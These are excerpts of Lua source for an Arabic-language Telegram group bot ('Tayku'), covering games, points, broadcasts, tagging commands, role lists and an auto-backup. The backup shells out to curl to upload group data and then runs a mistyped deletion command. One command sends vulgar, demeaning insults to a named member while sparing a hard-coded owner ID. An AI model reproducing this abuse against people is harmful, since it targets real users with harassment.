➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevLeo:setex(Tayku.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
TaykuTeam = '᥀︙اول واحد يحلها يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum'..msg.chat_id_) and not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then
...
name = DevLeo2[math.random(#DevLeo2)]
DevLeo:set(Tayku..'Rio:GameNum2'..msg.chat_id_,name)
DevLeo:del(Tayku..'Rio:Games:Ids'..msg.chat_id_)
...
TaykuTeam = '᥀︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum2'..msg.chat_id_) and not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then
if not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevLeo2[math.random(#DevLeo2)]
DevLeo:set(Tayku..'Rio:GameNum3'..msg.chat_id_,name)
DevLeo:del(Tayku..'Rio:Games:Ids'..msg.chat_id_)
...
TaykuTeam = '᥀︙ما هو عكس كلمة ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum3'..msg.chat_id_) and not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then
if not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then 
...
DevLeo2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevLeo2[math.random(#DevLeo2)]
DevLeo:set(Tayku..'Rio:GameNum4'..msg.chat_id_,name)
DevLeo:del(Tayku..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
TaykuTeam = '᥀︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum4'..msg.chat_id_) and not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then
if not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevLeo2[math.random(#DevLeo2)]
DevLeo:set(Tayku..'Rio:GameNum5'..msg.chat_id_,name)
DevLeo:del(Tayku..'Rio:Games:Ids'..msg.chat_id_)
...
TaykuTeam = '᥀︙اكمل المثال التالي ↫ ['..name..']'
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum5'..msg.chat_id_) then
if not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then 
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevLeo:del(Tayku..'Rio:GameNum5'..msg.chat_id_)
...
name = DevLeo2[math.random(#DevLeo2)]
DevLeo:set(Tayku..'Rio:GameNum6'..msg.chat_id_,name)
DevLeo:del(Tayku..'Rio:Games:Ids'..msg.chat_id_)
...
TaykuTeam = '᥀︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum6'..msg.chat_id_) then
if not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then 
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevLeo:del(Tayku..'Rio:GameNum6'..msg.chat_id_)
...
name = DevLeo2[math.random(#DevLeo2)]
DevLeo:set(Tayku..'Rio:GameNum7'..msg.chat_id_,name)
DevLeo:del(Tayku..'Rio:Games:Ids'..msg.chat_id_)
...
TaykuTeam = '᥀︙ما معنى كلمة ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md')
return false
end end
if text == DevLeo:get(Tayku..'Rio:GameNum7'..msg.chat_id_) then
if not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then 
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevLeo:del(Tayku..'Rio:GameNum7'..msg.chat_id_)
...
name = DevLeo2[math.random(#DevLeo2)]
DevLeo:set(Tayku..'Rio:GameNum8'..msg.chat_id_,name)
DevLeo:del(Tayku..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevLeo:get(Tayku..'Rio:GameNum8'..msg.chat_id_) then
if not DevLeo:get(Tayku..'Rio:Games:Ids'..msg.chat_id_) then 
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevLeo:del(Tayku..'Rio:GameNum8'..msg.chat_id_)
...
--     Source Tayku     --
if DevLeo:get(Tayku.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Rio(msg.chat_id_, msg.id_, 1,"᥀︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevLeo:get(Tayku.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevLeo:del(Tayku..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevLeo:del(Tayku.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevLeo:incrby(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevLeo:incrby(Tayku..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevLeo:get(Tayku..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevLeo:del(Tayku..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevLeo:del(Tayku.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevLeo:get(Tayku..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevLeo:get(Tayku..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevLeo:set(Tayku.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n᥀︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevLeo:setex(Tayku.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source Tayku     --
...
if not DevLeo:get(Tayku..'Rio:Lock:Games'..msg.chat_id_) then
DevLeo:del(Tayku.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevLeo:del(Tayku..'Rio:ListRolet'..msg.chat_id_)  
DevLeo:setex(Tayku.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevLeo:get(Tayku.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "᥀︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevLeo:set(Tayku.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '᥀︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n᥀︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevLeo:del(Tayku.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevLeo:get(Tayku.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevLeo:sismember(Tayku..'Rio:ListRolet'..msg.chat_id_,text) then
...
DevLeo:sadd(Tayku..'Rio:ListRolet'..msg.chat_id_,text)
local CountAdd = DevLeo:get(Tayku.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevLeo:scard(Tayku..'Rio:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevLeo:del(Tayku.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevLeo:setex(Tayku.."Rio:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
DevLeo0 = (DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevLeo:incrby(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevLeo0)
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙تم بيع '..(DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n᥀︙كل نقطه تساوي 50 رساله', 'md')
DevLeo:del(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source Tayku     --
...
DevLeo:sadd(Tayku..'Rio:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevLeo:sadd(Tayku..'Rio:RioConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
if DevLeo:get(Tayku.."Rio:Left:Bot"..Tayku) then
...
local msguser = tonumber(DevLeo:get(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevLeo:get(Tayku..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevLeo:get(Tayku..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevLeo:get(Tayku..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
...
DevLeo:setex(Tayku..'DevLeo4'..msg.sender_user_id_,360,true)
...
function TaykuTeam(extra,result,success)
if DevLeo:get(Tayku.."Rio:Send:Bot"..Tayku) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevLeo:smembers(Tayku.."Rio:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevLeo:smembers(Tayku.."Rio:Users")
for k,v in pairs(PvList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏في ↫ ❨ '..#GpList..' ❩ مجموعه \n᥀︙والى ↫ ❨ '..#PvList..' ❩ مشترك \n ✓', 1, 'md')
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TaykuTeam)
end
end
--     Source Tayku     --
if text == "مشاهده المنشور" and ChCheck(msg) or text == "مشاهدات المنشور" and ChCheck(msg) or text == "عدد المشاهدات" and ChCheck(msg) then
DevLeo:set(Tayku..'Rio:viewget'..msg.sender_user_id_,true)
...
Text = [[
Welcome To Source
᥀︙[Tayku Team](https://t.me/lllEll0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ Source Channel',url="https://t.me/lllEll0"}},
{{text = '᥀ Developer',url="t.me/lllEll1"},{text = '᥀ Tws Tayku',url="https://t.me/lllEll22bot"}},{{text= '᥀ Support Source .',url="https://t.me/lllEll0"}}
}
local msg_id = msg.id_/2097152/0.5
...
if DevLeo:get(Tayku.."Rio:Kick:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevLeo:set(Tayku..'yes'..msg.sender_user_id_, 'delyes')
DevLeo:set(Tayku..'no'..msg.sender_user_id_, 'delno')
...
DevLeo:set(Tayku.."Rio:Kick:Me"..msg.chat_id_, true)
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevLeo:del(Tayku.."Rio:Kick:Me"..msg.chat_id_)
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
end
--     Source Tayku     --
if text == "نزلني" and ChCheck(msg) then
if DevLeo:get(Tayku.."Rio:Del:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevLeo:set(Tayku..'yesdel'..msg.sender_user_id_, 'delyes')
DevLeo:set(Tayku..'nodel'..msg.sender_user_id_, 'delno')
...
DevLeo:set(Tayku.."Rio:Del:Me"..msg.chat_id_, true)
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevLeo:del(Tayku.."Rio:Del:Me"..msg.chat_id_)
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
end
--     Source Tayku     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:Lock:TagAll'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevLeo:get(Tayku..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevLeo:get(Tayku..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevLeo:get(Tayku..'Save:UserName'..v.user_id_).."]\n"
else
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku.."Rio:Lock:TagAll")
end
if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ᥀' then   
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للأعضاء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:Lock:TagAll",true) 
end 
if text and (text == "all" or text == "@all" or text == "#all") then
if (text and not DevLeo:get(Tayku.."Rio:Lock:TagAll")) then
if DevLeo:get(Tayku.."Rio:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevLeo:setex(Tayku..'Rio:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku.."Rio:Lock:TagAdmins")
end
if text == 'تعطيل @admin' or text == 'تعطيل admin' or text == '↫ تعطيل admin ᥀' then   
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للمشرفين'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku.."Rio:Lock:TagAdmins",true) 
end 
if text == "admin" or text == "@admin" or text == "#admin" then
if (text and not DevLeo:get(Tayku.."Rio:Lock:TagAdmins")) then
if DevLeo:get(Tayku.."Rio:TagAdmins:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevLeo:setex(Tayku..'Rio:TagAdmins:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
--     Source Tayku     --
if (text and not DevLeo:get(Tayku.."Rio:Lock:AutoFile")) then
Time = DevLeo:get(Tayku.."Rio:AutoFile:Time")
if Time then 
...
Welcomes = DevLeo:get(Tayku..'Rio:Groups:Welcomes'..v) or ''
RioConstructors = DevLeo:smembers(Tayku..'Rio:RioConstructor:'..v)
BasicConstructors = DevLeo:smembers(Tayku..'Rio:BasicConstructor:'..v)
Constructors = DevLeo:smembers(Tayku..'Rio:Constructor:'..v)
Managers = DevLeo:smembers(Tayku..'Rio:Managers:'..v)
Admis = DevLeo:smembers(Tayku..'Rio:Admins:'..v)
Vips = DevLeo:smembers(Tayku..'Rio:VipMem:'..v)
if k == 1 then
...
local curl = 'curl "' .. Rio .. '" -F "chat_id='..DevId..'" -F "document=@'..Tayku..'.json' .. '" -F "caption=᥀︙نسخه تلقائيه تحتوي على ↫ '..#list..' مجموعه"'
io.popen(curl)
io.popen('fm -fr '..Tayku..'.json')
DevLeo:set(Tayku.."Rio:AutoFile:Time",os.date("%x"))
end
else 
DevLeo:set(Tayku.."Rio:AutoFile:Time",os.date("%x"))
end
...
local EntryNumber = (DevLeo:get(Tayku..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevLeo:get(Tayku..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevLeo:get(Tayku..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:del(Tayku..'Rio:msg:Rio'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local TaykuTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, TaykuTeam, 14, string.len(msg.sender_user_id_))
DevLeo:set(Tayku..'Rio:msg:Rio'..msg.chat_id_,true)  
end
if DevLeo:get(Tayku.."Rio:msg:Rio"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevLeo:get(Tayku.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevLeo:setex(Tayku..'Rio:msg:Rio'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
get_msg = DevLeo:get(Tayku.."Rio:msg:Rio"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source Tayku     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevLeo:get(Tayku..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevLeo:get(Tayku..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevLeo:del(Tayku..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevLeo:del(Tayku..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source Tayku     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevLeo:get(Tayku..'Rio:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function TaykuTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(Tayku) then  
...
if tonumber(result.id_) == tonumber(1054308380) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevLeo:sismember(Tayku.."Rio:RioConstructor:"..msg.chat_id_,result.id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local TaykuTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md') 
local TaykuTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..TaykuTeam[math.random(#TaykuTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,TaykuTeam)
end
end
--     Source Tayku     --
...
if tonumber(result.sender_user_id_) == tonumber(Tayku) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
...
if tonumber(result.sender_user_id_) == tonumber(1054308380) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevLeo:sismember(Tayku.."Rio:RioConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local TaykuTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md') 
local TaykuTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..TaykuTeam[math.random(#TaykuTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local TaykuTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md') 
local TaykuTeam = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..TaykuTeam[math.random(#TaykuTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local TaykuTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md') 
local TaykuTeam = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Rio(msg.chat_id_, result.id_, 1,''..TaykuTeam[math.random(#TaykuTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
local TaykuTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Rio(msg.chat_id_, msg.id_, 1,TaykuTeam, 1, 'md') 
local TaykuTeam = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_Rio(msg.chat_id_, result.id_, 1,''..TaykuTeam[math.random(#TaykuTeam)], 1, 'html') 
else  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
...
if DevLeo:sismember(Tayku..'Rio:RioSudo:',result.sender_user_id_) then
riosudo = 'المطورين الاساسيين • ' else riosudo = '' end
if DevLeo:sismember(Tayku..'Rio:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevLeo:sismember(Tayku..'Rio:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevLeo:sismember(Tayku..'Rio:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevLeo:sismember(Tayku..'Rio:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevLeo:sismember(Tayku..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevLeo:sismember(Tayku..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevLeo:sismember(Tayku..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevLeo:sismember(Tayku..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
DevLeo:srem(Tayku..'Rio:RioSudo:', result.sender_user_id_)
DevLeo:srem(Tayku..'Rio:SecondSudo:', result.sender_user_id_)
DevLeo:srem(Tayku..'Rio:SudoBot:', result.sender_user_id_)
